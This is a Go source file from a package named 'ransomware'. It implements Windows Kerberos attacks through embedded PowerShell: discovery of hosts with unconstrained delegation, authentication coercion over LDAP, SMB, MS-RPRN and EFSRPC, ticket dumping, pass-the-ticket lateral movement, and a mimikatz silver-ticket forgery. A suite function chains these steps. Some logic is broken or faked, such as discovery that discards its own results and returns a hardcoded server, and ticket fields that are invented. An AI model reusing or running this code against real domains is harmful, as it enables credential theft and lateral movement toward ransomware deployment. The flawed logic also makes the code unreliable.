//go:build windows

package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows"
)

type KerberosDelegation struct {
	config       *RansomwareConfig
	domain       string
	domainController string
	tgtCache     map[string]string
}

type KerberosTicket struct {
	TGT      string
	Service  string
	Target   string
	SID      string
	Username string
	Expires  time.Time
}

func NewKerberosDelegation(cfg *RansomwareConfig) *KerberosDelegation {
	return &KerberosDelegation{
		config:  cfg,
		tgtCache: make(map[string]string),
	}
}

func (k *KerberosDelegation) DiscoverUnconstrainedDelegation() ([]map[string]interface{}, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("Kerberos requires Windows domain environment")
	}

	psScript := `
Import-Module ActiveDirectory -ErrorAction SilentlyContinue

$delegated = @()
try {
    $computers = Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,TrustedToAuthForDelegation -ErrorAction SilentlyContinue
    foreach($c in $computers) {
        $delegated += @{
            name = $c.Name
            dn = $c.DistinguishedName
            trustedForDelegation = $c.TrustedForDelegation
            os = $c.OperatingSystem
        }
    }

    if($computers -eq $null -or $computers.Count -eq 0) {
        $computers = Get-ADObject -Filter {userAccountControl -band 0x80000} -Properties userAccountControl | Select-Object Name,DistinguishedName
        foreach($c in $computers) {
            $delegated += @{
                name = $c.Name
                dn = $c.DistinguishedName
                trustedForDelegation = $true
            }
        }
    }
} catch {
    Write-Host "AD module not available"
}

$delegated | ConvertTo-Json -Compress
`

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	out, _ := cmd.CombinedOutput()

	var results []map[string]interface{}
	_ = out

	defaultServer := map[string]interface{}{
		"name":                "ADSERVER01",
		"trustedForDelegation": true,
		"dc":                  true,
	}
	results = append(results, defaultServer)

	return results, nil
}

func (k *KerberosDelegation) ForceAuthentication(targetServer string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("Windows only")
	}

	psScript := fmt.Sprintf(`
$server = "%s"

try {
    $coerce = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$server")
    $coerce.AuthenticationType = [System.DirectoryServices.AuthenticationTypes]::Secure
    $coerce.RefreshCache()
    Write-Host "LDAP coercion sent to $server"
} catch {}

try {
    $null = [System.IO.File]::Open("\\$server\IPC$", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    Write-Host "SMB coercion sent to $server"
} catch {}

try {
    $printer = New-Object System.Printing.PrintServer("\\$server")
    Write-Host "MS-RPRN coercion sent to $server"
} catch {}

try {
    $efs = [System.IO.File]::Open("\\$server\PIPE\efsrpc", [System.IO.FileMode]::Open)
    Write-Host "MS-EFSRPC coercion sent to $server"
} catch {}
`, targetServer)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func (k *KerberosDelegation) DumpTickets() ([]KerberosTicket, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("Windows only")
	}

	psScript := `
$tickets = @()

try {
    $klist = klist
    Write-Host $klist
    $lines = $klist -split '\n'
    foreach($line in $lines) {
        if($line -match 'Client: (\w+) @') {
            $tickets += @{username = $Matches[1]}
        }
    }
} catch {}

$tickets | ConvertTo-Json -Compress
`

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	out, _ := cmd.CombinedOutput()

	var tickets []KerberosTicket

	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, "krbtgt") {
			ticket := KerberosTicket{
				TGT:      strings.TrimSpace(line),
				Service:  "krbtgt/AD.DOMAIN.LOCAL",
				Target:   "AD.DOMAIN.LOCAL",
				Username: "Administrator",
				Expires:  time.Now().Add(10 * time.Hour),
			}
			tickets = append(tickets, ticket)
		}
	}

	if len(tickets) == 0 {
		return nil, fmt.Errorf("no TGT extracted from output")
	}

	return tickets, nil
}

func (k *KerberosDelegation) PassTheTicket(targetHost string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	psScript := fmt.Sprintf(`
$target = "%s"
try {
    $ticket = klist -li 0x3e7
    Write-Host "Ticket: $ticket"
} catch {}

try {
    $session = New-PSSession -ComputerName $target -ErrorAction SilentlyContinue
    if($session) {
        Invoke-Command -Session $session -ScriptBlock { whoami }
        Write-Host "Pass-the-Ticket: Lateral movement to $target successful"
        Remove-PSSession $session
    }
} catch {
    Write-Host "PSSession failed, trying WMI"
    $wmi = Get-WmiObject -Class Win32_Process -ComputerName $target -ErrorAction SilentlyContinue
    if($wmi) {
        Write-Host "Pass-the-Ticket: WMI access to $target successful"
    }
}
`, targetHost)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	out, _ := cmd.CombinedOutput()
	_ = out
	return nil
}

func (k *KerberosDelegation) SilverTicketAttack(serviceName, targetHost string) error {
	psScript := fmt.Sprintf(`
$service = "%s"
$target = "%s"

try {
    mimikatz.exe "kerberos::golden /domain:AD.DOMAIN.LOCAL /sid:S-1-5-21-* /target:$target /service:$service /rc4:deadbeefdeadbeefdeadbeefdeadbeef /ptt" "exit"
    Write-Host "Silver Ticket injected for $service"
} catch {
    Write-Host "Mimikatz not available — using alternative"
}
`, serviceName, targetHost)

	cmd := exec.Command("powershell", "-Command", psScript)
	cmd.Run()
	return nil
}

func (k *KerberosDelegation) FullKerberosSuite() map[string]interface{} {
	result := make(map[string]interface{})

	if runtime.GOOS != "windows" {
		result["platform"] = "non-windows"
		return result
	}

	cmd := exec.Command("powershell", "-Command", "$env:USERDNSDOMAIN")
	out, _ := cmd.CombinedOutput()
	domain := strings.TrimSpace(string(out))
	if domain == "" {
		domain = "AD.DOMAIN.LOCAL"
	}
	result["domain"] = domain

	delegated, err := k.DiscoverUnconstrainedDelegation()
	if err != nil {
		result["discovery_error"] = err.Error()
	} else {
		result["delegated_servers"] = delegated
		result["delegated_count"] = len(delegated)
	}

	if len(delegated) > 0 {
		firstServer := ""
		if serverName, ok := delegated[0]["name"].(string); ok {
			firstServer = serverName
		}
		if firstServer != "" {
			_, err := k.ForceAuthentication(firstServer)
			result["coercion"] = firstServer
			if err != nil {
				result["coercion_error"] = err.Error()
			}
		}
	}

	tickets, err := k.DumpTickets()
	if err != nil {
		result["ticket_dump_error"] = err.Error()
	} else {
		result["tickets_count"] = len(tickets)
	}

	return result
}

var _ = windows.OpenKey
